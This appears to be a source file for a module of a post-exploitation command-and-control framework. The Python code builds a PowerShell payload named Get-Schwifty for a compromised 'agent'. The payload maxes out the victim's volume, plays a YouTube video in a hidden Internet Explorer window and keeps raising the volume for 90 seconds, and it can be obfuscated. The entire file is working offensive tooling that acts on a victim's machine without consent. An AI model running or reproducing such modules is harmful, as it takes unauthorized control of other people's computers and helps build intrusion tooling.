from lib.common import helpers
class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'Get-Schwifty',
            'Author': ['@424f424f'],
            'Description': ("Play's a hidden version of Rick and Morty Get Schwifty video while "
                            "maxing out a computer's volume."),
            'Background' : True,
            'OutputExtension' : None,
            'NeedsAdmin' : False,
            'OpsecSafe' : False,
            'Language' : 'powershell',
            'MinLanguageVersion' : '2',
            'Comments': [
                'https://github.com/obscuresec/shmoocon/blob/master/Invoke-TwitterBot'
            ]
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'VideoURL' : {
                'Description'   :   'Other YouTube video URL to play instead of Get Schwifty.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }
        self.mainMenu = mainMenu
        for param in params:
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        script = """
Function Get-Schwifty
{
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $False, Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String] $VideoURL = "https://www.youtube.com/watch?v=I1188GO4p1E"
    )
    Function Set-Speaker($Volume){$wshShell = new-object -com wscript.shell;1..50 | % {$wshShell.SendKeys([char]174)};1..$Volume | % {$wshShell.SendKeys([char]175)}}
    Set-Speaker -Volume 50   
    $IEComObject = New-Object -com "InternetExplorer.Application"
    $IEComObject.visible = $False
    $IEComObject.navigate($VideoURL)
    Start-Sleep -s 5
    $EndTime = (Get-Date).addseconds(90)
    do {
       $WscriptObject = New-Object -com wscript.shell
       $WscriptObject.SendKeys([char]175)
    }
    until ((Get-Date) -gt $EndTime)
} Get-Schwifty"""
        for option,values in self.options.iteritems():
            if option.lower() != "agent" and option.lower() != "computername":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values['Value'])
        script += "; 'Agent is getting schwifty!'"
        if obfuscate:
            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
        return script